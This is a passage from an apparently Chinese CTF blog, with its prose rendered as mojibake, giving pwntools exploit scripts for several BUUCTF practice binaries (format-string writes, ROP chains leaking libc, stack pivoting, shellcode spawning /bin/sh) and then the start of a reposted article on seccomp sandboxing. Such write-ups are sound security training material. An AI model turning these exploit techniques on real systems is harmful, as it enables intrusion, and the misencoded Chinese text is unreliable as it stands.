class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+<span class="hljs-string">&#x27;beef&#x27;</span><br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&quot;beef&quot;</span>)<br>ebp=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ebp)<br>s_buf=ebp-<span class="hljs-number">0x38</span><br>payload=(<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+p32(<span class="hljs-number">1</span>)+p32(s_buf+<span class="hljs-number">0x10</span>)+<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>).ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+p32(s_buf)+p32(leave_ret)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="äºŒåã€jarvisoj-fm"><a href="#äºŒåã€jarvisoj-fm" class="headerlink" title="äºŒåã€jarvisoj_fm"></a>äºŒåã€jarvisoj_fm</h3><p>ä¸€é“å¾ˆå¹³å¸¸çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é¢˜ç›®ï¼Œå°±ç›´æ¥ç»™expäº†</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">25092</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>x=<span class="hljs-number">0x0804A02C</span><br><br>payload=p32(x)+<span class="hljs-string">&#x27;%11$n&#x27;</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="äºŒåä¸€ã€-HarekazeCTF2019-baby-rop2"><a href="#äºŒåä¸€ã€-HarekazeCTF2019-baby-rop2" class="headerlink" title="äºŒåä¸€ã€[HarekazeCTF2019]baby_rop2"></a>äºŒåä¸€ã€[HarekazeCTF2019]baby_rop2</h3><p>ä¸€é“å¸¸è§„ropé¢˜ç›®ï¼Œé™¤äº†è¿™é¢˜printfä¼šå‡ºç°ä¸‹å›¾çš„åŒ¹é…ä¸åˆ°libcä¹‹å¤–ï¼Œå…¶ä»–æ²¡ä»€ä¹ˆï¼Œè€Œå¯¹äºè¿™ä¸ªï¼Œåªè¦æ¢ä¸ªå‡½æ•°ï¼Œæˆ‘è¿™è¾¹ç”¨readï¼Œå°±å¯ä»¥äº†ã€‚å™¢ï¼Œè¿˜æœ‰ï¼ç›®å½•é‡Œé¢æ²¡æœ‰flag</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210506220516.png"></p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26933</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_rdi=<span class="hljs-number">0x400733</span><br>ret=<span class="hljs-number">0x4004d1</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">&#x27;name? &#x27;</span>,payload)<br>p.recvline()<br>read=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(read)<br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendline(payload)<br>p.recvline()<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="äºŒåäºŒã€ez-pz-hackover-2016"><a href="#äºŒåäºŒã€ez-pz-hackover-2016" class="headerlink" title="äºŒåäºŒã€ez_pz_hackover_2016"></a>äºŒåäºŒã€ez_pz_hackover_2016</h3><p>å¸¸è§„checksecä¸€ä¸‹ï¼ŒæŸ¥çœ‹ä¿æŠ¤æœºåˆ¶</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509091010.png"></p>
<p>nxéƒ½æ²¡å¼€ï¼Œåº”è¯¥æ˜¯æ³¨å…¥shellcodeæ¥getshelläº†ï¼Œè¿›å…¥idaçœ‹çœ‹ä»£ç </p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509091119.png"></p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509091125.png"></p>
<p>ç¡®å®ï¼Œæ²¡ç»™åé—¨å‡½æ•°ï¼Œnxæ²¡å¼€ï¼Œåº”è¯¥å°±æ˜¯æ³¨å…¥shellcodeäº†ï¼Œæˆ‘ä»¬çœ‹çœ‹ä»£ç ï¼Œé¦–å…ˆé¢˜ç›®å…ˆæŠŠsçš„åœ¨æ ˆä¸Šçš„åœ°å€æ³„éœ²å‡ºæ¥äº†ï¼Œåé¢åˆ™éœ€è¦ç»•è¿‡crashmeï¼Œè¿™ä¸ªç®€å•ï¼Œå…ˆè¾“å…¥è¿™ä¸ªï¼ŒåŠ ä¸Š\x00è®©strcmpæ£€éªŒé€šè¿‡ï¼Œä¹‹åï¼Œåœ¨vulné‡Œé¢çš„memcpyå­˜åœ¨ç€æº¢å‡ºï¼Œé‡Œé¢çš„æ ˆæ¯”è¾ƒå°ï¼Œè€Œå¤–é¢çš„æ ˆè¾ƒå¤§ï¼Œå¯ä»¥å†™å…¥shellcodeï¼Œæ¥ä¸‹å°±è®¡ç®—shellcodeçš„åœ°å€ï¼Œä»¥åŠæº¢å‡ºç‚¹çš„åç§»è·ç¦»ï¼Œè¿™è¾¹æœ‰å‘çš„å°±æ˜¯IDAé‡Œé¢çš„åç§»æ˜¯é”™çš„ï¼Œæˆ‘ä»¬éœ€è¦è¿›å…¥gdbåŠ¨è°ƒè¯•è¿›è¡Œæ‰¾å¯»åœ°å€ä»¥åŠåç§»è·ç¦»</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509091757.png"></p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509091821.png"></p>
<p>æˆ‘ä»¬æ³„éœ²çš„åœ°å€è·ç¦»å­—ç¬¦ä¸²èµ·å§‹åœ°å€0xffc445f0ç›¸å‡ä¹‹åï¼Œç›¸å·®0x1c</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509092023.png"></p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509092054.png"></p>
<p>åƒåœ¾å­—ç¬¦ä¸²åç§»æ˜¯18ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜è¾“å…¥äº†crashme\x00ï¼Œæ‰€ä»¥æ€»çš„åç§»æ˜¯26ä¸ªã€‚ä¹‹åå°±æ˜¯return to shellcodeäº†</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=remote(&quot;node3.buuoj.cn&quot;,29815)</span><br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>gdb.attach(p)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>s_buf=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(s_buf)<br>shellcode=asm(shellcraft.sh())<br>payload=<span class="hljs-string">&quot;crashme\x00&quot;</span>.ljust(<span class="hljs-number">26</span>,<span class="hljs-string">&#x27;a&#x27;</span>)+p32(s_buf-<span class="hljs-number">0x1c</span>)+shellcode<br>p.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="äºŒåä¸‰ã€-Black-Watch-å…¥ç¾¤é¢˜-PWN"><a href="#äºŒåä¸‰ã€-Black-Watch-å…¥ç¾¤é¢˜-PWN" class="headerlink" title="äºŒåä¸‰ã€[Black Watch å…¥ç¾¤é¢˜]PWN"></a>äºŒåä¸‰ã€[Black Watch å…¥ç¾¤é¢˜]PWN</h3><p>å¸¸è§„checksecä¸€ä¸‹</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509171725.png"></p>
<p>åªå¼€å¯äº†nxä¿æŠ¤ï¼Œè¿›å…¥idaçœ‹çœ‹ä»£ç </p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509171818.png"></p>
<p>ç»™äº†ä¸¤æ¬¡è¾“å…¥ï¼Œç¬¬ä¸€æ¬¡åœ¨.bssæ®µä¸Šï¼Œç¬¬äºŒæ¬¡æ˜¯æ ˆï¼Œæ ˆä¸Šçš„åªå¤Ÿè¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œä½†æ˜¯.bsså´å¯ä»¥è¾“å…¥å¤§é‡æ•°æ®ï¼Œæ‰€ä»¥è¦åŠ«æŒæ ˆåˆ°.bssè¿›è¡Œropï¼Œæ‰€ä»¥è¦è®©ebpçš„å€¼ä¸ºsçš„åœ°å€ï¼Œè¿”å›åœ°å€ä¸ºleaveï¼ŒæŠŠæ ˆåŠ«æŒåˆ°.bssä¸Šï¼Œå…¶ä»–å‰©ä¸‹å°±æ˜¯å¸¸è§„çš„rop</p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26260</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>leave_ret=<span class="hljs-number">0x8048408</span><br>s_buf=<span class="hljs-number">0x0804A300</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload=<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>,payload)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(s_buf)+p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>,payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(write)<br>libc=LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;xxxx&#x27;</span>+p32(system)+p32(main)+p32(binsh)<br>p.recv()<br>p.send(payload)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(s_buf)+p32(leave_ret)<br>p.recv()<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="äºŒåå››ã€jarvisoj-tell-me-something"><a href="#äºŒåå››ã€jarvisoj-tell-me-something" class="headerlink" title="äºŒåå››ã€jarvisoj_tell_me_something"></a>äºŒåå››ã€jarvisoj_tell_me_something</h3><p>è¿™é¢˜ï¼Œè¿›å…¥idaé‡Œé¢</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509174709.png"></p>
<p>æœ‰ä¸ªè¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥çœ‹è§ï¼Œå·²ç»è¯»å–äº†flagï¼Œå¹¶ä¸”è¿˜ä¼šå°†å…¶è¾“å‡ºï¼Œå¹¶ä¸”mainå‡½æ•°æœ‰æº¢å‡ºç‚¹ï¼Œè·³è½¬åˆ°è¿™ï¼Œå†æ¥æ”¶flagå³å¯</p>
<p>expï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">p</span>=remote(&#x27;node3.buuoj.cn&#x27;,28478)<br>context.<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*0x88+p64(0x400620)<br>p.sendlineafter(<span class="hljs-string">&quot;message:&quot;</span>,payload)<br>p.recvline()<br>p.recvall()<br></code></pre></td></tr></table></figure>

<h3 id="äºŒåäº”ã€gwctf-2019-easy-pwn"><a href="#äºŒåäº”ã€gwctf-2019-easy-pwn" class="headerlink" title="äºŒåäº”ã€gwctf_2019_easy_pwn"></a>äºŒåäº”ã€gwctf_2019_easy_pwn</h3><p>ç…§ä¾‹checksec</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509181618.png"></p>
<p>åªå¼€å¯äº†nxï¼Œè¿›å…¥idaå‘ç°æ˜¯c++å†™çš„ï¼Œçœ‹ä¸æ‡‚ã€‚ã€‚ã€‚</p>
<img src="/2021/05/05/2021-05-05-buu04/QQå›¾ç‰‡20210509181725.png" style="zoom:80%;">

<p>ç›´æ¥è¾“å…¥æ˜¯ä¸å¤Ÿæº¢å‡ºçš„ï¼Œç„¶åå¾€ä¸‹çœ‹ï¼Œå‘ç°è¿˜æœ‰ä¸ªstrcpyï¼Œå¯èƒ½å¯ä»¥æº¢å‡ºï¼Œä½†æ˜¯v4ä¸çŸ¥é“å’‹æ¥çš„ï¼Œç„¶åå°±è·‘å»ç™¾åº¦äº†ï¼ˆçœŸæ²¡å¿—æ°”ï¼Œhhï¼‰ï¼Œå‘ç°å…¶å®èƒ½çœ‹æ‡‚åº”è¯¥å¾ˆç®€å•ï¼Œä¸è¿‡å¯èƒ½å°±æ˜¯ä¸ºäº†è®©äººçœ‹ä¸æ‡‚å§ï¼Œå—¯ï¼Œåº”è¯¥è¦å­¦c++äº†ï¼ï¼ˆä¸‹æ¬¡ä¸€å®šï¼‰</p>
<p>è¿™è¾¹æ˜¯Iå¯ä»¥è¢«æ›¿æ¢ä¸ºprettyï¼Œæ‰€ä»¥å¡«å…¥Iï¼Œè¢«è½¬æ¢æº¢å‡ºï¼Œè€Œè·³è½¬è¿›è¡Œrop</p>
<p><img src="/2021/05/05/2021-05-05-buu04/QQ%E5%9B%BE%E7%89%8720210509181629.png"></p>
<p>æ˜ç™½è¿™ä¸ªï¼Œå…¶ä»–ä¹Ÿå°±æ²¡ä»€ä¹ˆäº†</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">26014</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main=<span class="hljs-number">0x8049091</span><br><br>payload=<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>+p32(puts_plt)+p32(main)+p32(puts_got)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;pretty&#x27;</span>*<span class="hljs-number">16</span>)<br>p.recv(<span class="hljs-number">12</span>)<br>puts=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts))<br>one_gadget=puts-<span class="hljs-number">0x05f140</span>+<span class="hljs-number">0x5f066</span><br><span class="hljs-comment">#system=puts-0x24800</span><br><span class="hljs-comment">#binsh=puts+0xf9eeb</span><br><span class="hljs-comment">#payload=&#x27;I&#x27;*16+p32(system)+&#x27;dead&#x27;+p32(binsh)</span><br>payload=<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>+p32(one_gadget)<br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆæ¢æ²™ç®±â€”â€”â€”è½¬è½½</title>
    <url>/2021/04/29/2021-04-29-%E5%88%9D%E6%8E%A2%E6%B2%99%E7%AE%B1%E2%80%94%E2%80%94%E2%80%94%E8%BD%AC%E8%BD%BD/</url>
    <content><![CDATA[<p><strong>zè½¬è½½è‡ª<a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/">Tieguâ€™s Blog</a></strong></p>
<h1 id="æ²™ç®±æœºåˆ¶åˆæ¢"><a href="#æ²™ç®±æœºåˆ¶åˆæ¢" class="headerlink" title="æ²™ç®±æœºåˆ¶åˆæ¢"></a>æ²™ç®±æœºåˆ¶åˆæ¢</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰åšé¢˜é‡åˆ°è¿‡å‡ æ¬¡å…³äºæ²™ç®±çš„é¢˜ç›®ï¼Œè‡ªå·±éƒ½æ˜¯é çŒœæˆ–è€…æ˜¯å»ç½‘ä¸Šæ‰¾ä¸€äº›é›¶ç¢çš„çŸ¥è¯†å»åšçš„ï¼Œç°åœ¨åˆ·buuå‘ç°ä¸€é“å…³äºæ²™ç®±æœºåˆ¶çš„é¢˜ç›®ï¼ŒåŠ ä¹‹æœ€è¿‘è§‰å¾—æ²¡å†™åšå®¢æ„Ÿè§‰å¾ˆå¤šçŸ¥è¯†ç‚¹å¿˜å¾—å¾ˆå¿«ï¼Œæ‰€ä»¥æ‰“ç®—å­¦ä¹ ä¸€ä¸‹æ²™ç®±æœºåˆ¶ï¼Œé¡ºä¾¿å†™ä¸€ç¯‡åšå®¢å»è®°å½•ä¸€ä¸‹ã€‚</p>
<h2 id="whatâ€™s-the-æ²™ç®±å®‰å…¨æœºåˆ¶"><a href="#whatâ€™s-the-æ²™ç®±å®‰å…¨æœºåˆ¶" class="headerlink" title="whatâ€™s the æ²™ç®±å®‰å…¨æœºåˆ¶"></a>whatâ€™s the æ²™ç®±å®‰å…¨æœºåˆ¶</h2><p>åœ¨è®¡ç®—æœºå®‰å…¨é¢†åŸŸï¼Œæ²™ç®±(Sandbox)æ˜¯ä¸€ç§ç¨‹åºçš„éš”ç¦»è¿è¡Œæœºåˆ¶ï¼Œå…¶ç›®çš„æ˜¯é™åˆ¶ä¸å¯ä¿¡è¿›ç¨‹æˆ–ä¸å¯ä¿¡ä»£ç è¿è¡Œæ—¶çš„è®¿é—®æƒé™ã€‚æ²™ç®±æŠ€æœ¯ç»å¸¸è¢«ç”¨äºæ‰§è¡Œæœªç»æµ‹è¯•çš„æˆ–ä¸å¯ä¿¡çš„å®¢æˆ·ç¨‹åºã€‚ä¸ºäº†é˜»æ­¢ä¸å¯ä¿¡ç¨‹åºå¯èƒ½ç ´åç³»ç»Ÿç¨‹åºæˆ–ç ´åå…¶å®ƒç”¨æˆ·ç¨‹åºçš„è¿è¡Œï¼Œæ²™ç®±æŠ€æœ¯é€šè¿‡ä¸ºä¸å¯ä¿¡å®¢æˆ·ç¨‹åºæä¾›è™šæ‹ŸåŒ–çš„å†…å­˜ã€æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œç­‰èµ„æºï¼Œè€Œè¿™ç§è™šæ‹ŸåŒ–æ‰‹æ®µå¯¹å®¢æˆ·ç¨‹åºæ¥è¯´æ˜¯é€æ˜çš„ã€‚ç”±äºæ²™ç®±é‡Œçš„èµ„æºè¢«è™šæ‹ŸåŒ–ï¼ˆæˆ–è¢«é—´æ¥åŒ–ï¼‰ï¼Œæ‰€ä»¥æ²™ç®±é‡Œçš„ä¸å¯ä¿¡ç¨‹åºçš„æ¶æ„è¡Œä¸ºå¯ä»¥è¢«é™åˆ¶åœ¨æ²™ç®±ä¸­ï¼Œæˆ–è€…åœ¨æ²™ç®±é‡Œåªå…è®¸æ‰§è¡Œåœ¨ç™½åå•é‡Œè§„å®šçš„æœ‰é™çš„APIæ“ä½œã€‚</p>
<p><strong>çœ‹æ¦‚å¿µæ„Ÿè§‰æ²™ç®±æœºåˆ¶æ˜¯ä¸€ç§å®‰å…¨éš”ç¦»æŠ€æœ¯ï¼Œä½†æ˜¯ä¸ªäººæ„Ÿè§‰ç›®å‰åšpwné¢˜é‡åˆ°çš„æ²™ç®±æœºåˆ¶ç”¨åˆ°çš„æ˜¯å¯¹äºä¸€äº›system callçš„è°ƒç”¨çš„banï¼Œæ‰€ä»¥ä»¥ä¸‹ä»‹ç»çš„ä¸æ˜¯å¯¹è¿™ä¸ªæ²™ç®±æœºåˆ¶çš„æ·±å…¥äº†è§£ï¼Œè€Œæ˜¯ä»‹ç»ä¸¤ç§å¸¸è§çš„æ²™ç®± seccomp å®‰å…¨æœºåˆ¶å’Œ prctl ã€‚</strong></p>
<h2 id="seccompçš„æ¢ç´¢"><a href="#seccompçš„æ¢ç´¢" class="headerlink" title="seccompçš„æ¢ç´¢"></a><code>seccomp</code>çš„æ¢ç´¢</h2><h3 id="What-is-seccomp"><a href="#What-is-seccomp" class="headerlink" title="What is seccomp"></a>What is seccomp</h3><p>seccomp (short for secure computing mode) is a computer security facility in the Linux kernel. It was merged into the Linux kernel mainline in kernel version 2.6.12, which was released on March 8, 2005. seccomp allows a process to make a one-way transition into a â€œsecureâ€ state where it cannot make any system calls except exit(), sigreturn(), read() and write() to already-open file descriptors. Should it attempt any other system calls, the kernel will terminate the process with SIGKILL or SIGSYS. In this sense, it does not virtualize the systemâ€™s resources but isolates the process from them entirely.</p>
<h3 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h3><p>è¿™é‡Œä¸»è¦ä»‹ç»å‡ ä¸ªå‡½æ•°ä»¥åŠåˆ©ç”¨ã€‚</p>
<p><strong><a href="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/1.png"><img src="https://pig-sudo.github.io/2020/08/03/%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%E5%88%9D%E6%8E%A2/1.png" alt="img"></a></strong></p>
<p><code>ctx</code>æ˜¯<code>Filter context/handle</code>,å…¶ä¸­<code>typedef void *scmp_filter_ctx;</code><br><code>seccomp_init</code>æ˜¯åˆå§‹åŒ–çš„è¿‡æ»¤çŠ¶æ€,è¿™é‡Œç”¨çš„æ˜¯<code>SCMP_ACT_ALLOW</code>,è¡¨ç¤ºé»˜è®¤å…è®¸æ‰€æœ‰çš„syscacll.å¦‚æœåˆå§‹åŒ–çŠ¶æ€ä¸º<code>SCMP_ACT_KILL</code>,åˆ™è¡¨ç¤ºé»˜è®¤ä¸å…è®¸æ‰€æœ‰çš„syscall ï¼ˆè¯¦è§ä¸‹å›¾ï¼‰</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * seccomp actions</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Kill the process</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_KILL		0x00000000U</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Throw a SIGSYS signal</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_TRAP		0x00030000U</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Return the specified error code</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_ERRNO(x)	(0x00050000U | ((x) &amp; 0x0000ffffU))</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Notify a tracing process with the specified value</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_TRACE(x)	(0x7ff00000U | ((x) &amp; 0x0000ffffU))</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Allow the syscall to be executed after the action has been logged</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_LOG		0x7ffc0000U</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Allow the syscall to be executed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SCMP_ACT_ALLOW		0x7fff0000U</span><br></code></pre></td></tr></table></figure>

<p><code>seccomp_rule_add</code>æ˜¯æ·»åŠ ä¸€æ¡è§„åˆ™,å‡½æ•°åŸå½¢å¦‚ä¸‹</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> seccomp<span class="hljs-constructor">_rule_add(<span class="hljs-params">scmp_filter_ctx</span> <span class="hljs-params">ctx</span>, <span class="hljs-params">uint32_t</span> <span class="hljs-params">action</span>, <span class="hljs-params">int</span> <span class="hljs-params">syscall</span>, <span class="hljs-params">unsigned</span> <span class="hljs-params">int</span> <span class="hljs-params">arg_cnt</span>, <span class="hljs-operator">...</span>)</span>;<br></code></pre></td></tr></table></figure>

<p><code>seccomp_load</code>æ˜¯åº”ç”¨è¿‡æ»¤,å¦‚æœä¸è°ƒç”¨<code>seccomp_load</code>åˆ™ä¸Šé¢æ‰€æœ‰çš„è¿‡æ»¤éƒ½ä¸ä¼šç”Ÿæ•ˆ</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> seccomp<span class="hljs-constructor">_load(<span class="hljs-params">const</span> <span class="hljs-params">scmp_filter_ctx</span> <span class="hljs-params">ctx</span>)</span>;<br></code></pre></td></tr></table></figure>

<p>æœ‰ä¸€ç‚¹éœ€è¦å†è¯´ä¸€ä¸‹,æˆ‘ä»¬ç”¨çš„æ˜¯<code>seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);</code>,<code>arg_cnt</code>ä¸º0,è¡¨ç¤ºæˆ‘ä»¬ç›´æ¥é™åˆ¶execve,ä¸ç®¡ä»–ä»€ä¹ˆå‚æ•°.</p>
<p>å¦‚æœ<code>arg_cnt</code>ä¸ä¸º0,é‚£<code>arg_cnt</code>è¡¨ç¤ºåé¢é™åˆ¶çš„å‚æ•°çš„ä¸ªæ•°,ä¹Ÿå°±æ˜¯åªæœ‰è°ƒç”¨execve,ä¸”å‚æ•°æ»¡è¶³è¦æ±‚æ—¶,æ‰ä¼šæ‹¦æˆªsyscall.ï¼ˆå‚æ•°è¯¦æƒ…å‚è§ä¸‹å›¾ï¼‰</p>
